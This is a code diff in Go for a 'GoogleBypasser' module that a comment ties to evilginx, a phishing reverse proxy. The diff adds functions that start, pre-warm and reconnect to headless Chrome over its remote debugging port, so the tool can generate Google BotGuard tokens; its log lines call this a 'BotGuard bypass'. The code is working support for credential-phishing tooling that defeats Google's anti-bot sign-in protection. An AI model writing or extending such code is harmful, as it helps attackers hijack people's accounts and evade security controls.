@@ -7,6 +7,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"os/exec"
 	"regexp"
 	"strings"
 	"sync"
@@ -32,20 +33,189 @@ type GoogleBypasser struct {
 
 var bgRegexp = regexp.MustCompile(`identity-signin-identifier\\",\\"([^"]+)`)
 
-// func (b *GoogleBypasser) Launch() {
-// 	log.Debug("[GoogleBypasser]: : Launching Browser .. ")
-// 	u := launcher.New().
-// 		Headless(b.isHeadless).
-// 		Devtools(b.withDevTools).
-// 		NoSandbox(true).
-// 		MustLaunch()
-// 	b.browser = rod.New().ControlURL(u)
-// 	if b.slowMotionTime > 0 {
-// 		b.browser = b.browser.SlowMotion(b.slowMotionTime)
-// 	}
-// 	b.browser = b.browser.MustConnect()
-// 	b.page = stealth.MustPage(b.browser)
-// }
+// chromeMutex prevents multiple goroutines from trying to start Chrome simultaneously
+var chromeMutex sync.Mutex
+
+// chromeReady indicates if Chrome has been pre-warmed and is ready
+var chromeReady bool = false
+var chromeReadyMutex sync.RWMutex
+
+// PreWarmChrome should be called at startup to ensure Chrome is ready before any requests
+// This prevents the "first request fails" issue by warming up Chrome ahead of time
+func PreWarmChrome() error {
+	log.Info("[GoogleBypasser] Pre-warming Chrome for BotGuard token generation...")
+
+	// Ensure Chrome is running
+	if err := ensureChromeRunning(); err != nil {
+		log.Error("[GoogleBypasser] Failed to pre-warm Chrome: %v", err)
+		return err
+	}
+
+	// Verify we can get a WebSocket URL
+	wsURL, err := getWebSocketDebuggerURL()
+	if err != nil {
+		log.Error("[GoogleBypasser] Chrome running but WebSocket not available: %v", err)
+		return err
+	}
+
+	log.Info("[GoogleBypasser] Chrome WebSocket URL: %s", wsURL)
+
+	// Try to create a test page to verify Chrome is fully functional
+	browser := rod.New().ControlURL(wsURL)
+	if err := browser.Connect(); err != nil {
+		log.Error("[GoogleBypasser] Failed to connect to Chrome: %v", err)
+		return err
+	}
+
+	// Create a test page
+	page, err := browser.Page(proto.TargetCreateTarget{URL: "about:blank"})
+	if err != nil {
+		log.Error("[GoogleBypasser] Failed to create test page: %v", err)
+		browser.Close()
+		return err
+	}
+
+	// Close the test page
+	page.Close()
+	browser.Close()
+
+	// Mark Chrome as ready
+	chromeReadyMutex.Lock()
+	chromeReady = true
+	chromeReadyMutex.Unlock()
+
+	log.Success("[GoogleBypasser] Chrome pre-warmed and ready for BotGuard bypass!")
+	return nil
+}
+
+// IsChromeReady returns true if Chrome has been pre-warmed
+func IsChromeReady() bool {
+	chromeReadyMutex.RLock()
+	defer chromeReadyMutex.RUnlock()
+	return chromeReady
+}
+
+// findChromeBinary finds the Chrome/Chromium binary path
+func findChromeBinary() (string, error) {
+	chromePaths := []string{
+		"google-chrome",
+		"google-chrome-stable",
+		"chromium-browser",
+		"chromium",
+		"/usr/bin/google-chrome",
+		"/usr/bin/google-chrome-stable",
+		"/usr/bin/chromium-browser",
+		"/usr/bin/chromium",
+		"/opt/google/chrome/google-chrome",
+		"/snap/bin/chromium",
+	}
+
+	for _, path := range chromePaths {
+		if fullPath, err := exec.LookPath(path); err == nil {
+			return fullPath, nil
+		}
+	}
+
+	return "", fmt.Errorf("Chrome/Chromium binary not found. Please install Google Chrome or Chromium")
+}
+
+// isChromRunning checks if Chrome is running on port 9222
+func isChromeRunning() bool {
+	resp, err := http.Get("http://127.0.0.1:9222/json")
+	if err != nil {
+		return false
+	}
+	defer resp.Body.Close()
+	return resp.StatusCode == 200
+}
+
+// startChromeHeadless starts Chrome in headless mode with remote debugging
+func startChromeHeadless() error {
+	chromeMutex.Lock()
+	defer chromeMutex.Unlock()
+
+	// Double-check if Chrome is already running (another goroutine might have started it)
+	if isChromeRunning() {
+		log.Info("[GoogleBypasser] Chrome is already running on port 9222")
+		return nil
+	}
+
+	chromePath, err := findChromeBinary()
+	if err != nil {
+		return err
+	}
+
+	log.Info("[GoogleBypasser] Starting Chrome headless: %s", chromePath)
+
+	cmd := exec.Command(chromePath,
+		"--headless",
+		"--disable-gpu",
+		"--no-sandbox",
+		"--disable-dev-shm-usage",
+		"--remote-debugging-port=9222",
+		"--remote-debugging-address=127.0.0.1",
+		"--disable-background-networking",
+		"--disable-default-apps",
+		"--disable-extensions",
+		"--disable-sync",
+		"--disable-translate",
+		"--hide-scrollbars",
+		"--metrics-recording-only",
+		"--mute-audio",
+		"--no-first-run",
+		"--safebrowsing-disable-auto-update",
+	)
+
+	// Redirect output to /dev/null to prevent cluttering logs
+	cmd.Stdout = nil
+	cmd.Stderr = nil
+
+	if err := cmd.Start(); err != nil {
+		return fmt.Errorf("failed to start Chrome: %v", err)
+	}
+
+	log.Info("[GoogleBypasser] Chrome process started with PID: %d", cmd.Process.Pid)
+
+	// Wait for Chrome to be ready (up to 10 seconds)
+	for i := 0; i < 20; i++ {
+		time.Sleep(500 * time.Millisecond)
+		if isChromeRunning() {
+			log.Success("[GoogleBypasser] Chrome is now running on port 9222")
+			return nil
+		}
+	}
+
+	return fmt.Errorf("Chrome started but not responding on port 9222 after 10 seconds")
+}
+
+// ensureChromeRunning ensures Chrome is running, starting it if necessary
+func ensureChromeRunning() error {
+	maxRetries := 3
+
+	for attempt := 1; attempt <= maxRetries; attempt++ {
+		if isChromeRunning() {
+			return nil
+		}
+
+		log.Warning("[GoogleBypasser] Chrome not running (attempt %d/%d), starting...", attempt, maxRetries)
+
+		if err := startChromeHeadless(); err != nil {
+			log.Error("[GoogleBypasser] Failed to start Chrome: %v", err)
+			if attempt < maxRetries {
+				time.Sleep(2 * time.Second)
+				continue
+			}
+			return err
+		}
+
+		// Verify Chrome is running after start
+		if isChromeRunning() {
+			return nil
+		}
+	}
+
+	return fmt.Errorf("failed to ensure Chrome is running after %d attempts", maxRetries)
+}
 
 func getWebSocketDebuggerURL() (string, error) {
 	resp, err := http.Get("http://127.0.0.1:9222/json")
@@ -77,16 +247,40 @@ func getWebSocketDebuggerURL() (string, error) {
 func (b *GoogleBypasser) Launch() {
 	log.Debug("[GoogleBypasser]: Launching Browser .. ")
 
-	wsURL, err := getWebSocketDebuggerURL()
-	if err != nil {
-		log.Error("Failed to get WebSocket debugger URL: %v", err)
-		// Fallback: launch a browser ourselves. This avoids a hard crash when
-		// evilginx is running as root and the Chrome debugger isn't available.
+	// First, ensure Chrome is running (auto-start if needed)
+	if err := ensureChromeRunning(); err != nil {
+		log.Error("[GoogleBypasser] Failed to ensure Chrome is running: %v", err)
+		// Try fallback with go-rod launcher
+		log.Warning("[GoogleBypasser] Attempting fallback with go-rod launcher...")
 		l := launcher.New().Headless(b.isHeadless).Devtools(b.withDevTools)
 		if os.Geteuid() == 0 {
 			l = l.NoSandbox(true)
 		}
-		wsURL = l.MustLaunch()
+		wsURL := l.MustLaunch()
+		b.browser = rod.New().ControlURL(wsURL)
+		if b.slowMotionTime > 0 {
+			b.browser = b.browser.SlowMotion(b.slowMotionTime)
+		}
+		b.browser = b.browser.MustConnect()
+		b.page = b.browser.MustPage()
+		log.Debug("[GoogleBypasser]: Browser connected via fallback launcher.")
+		return
+	}
+
+	// Get WebSocket debugger URL
+	wsURL, err := getWebSocketDebuggerURL()
+	if err != nil {
+		log.Error("[GoogleBypasser] Failed to get WebSocket debugger URL: %v", err)
+		// Try to restart Chrome and get URL again
+		if restartErr := startChromeHeadless(); restartErr != nil {
+			log.Error("[GoogleBypasser] Failed to restart Chrome: %v", restartErr)
+			return
+		}
+		wsURL, err = getWebSocketDebuggerURL()
+		if err != nil {
+			log.Error("[GoogleBypasser] Still failed to get WebSocket URL after restart: %v", err)
+			return
+		}
 	}
 
 	b.browser = rod.New().ControlURL(wsURL)
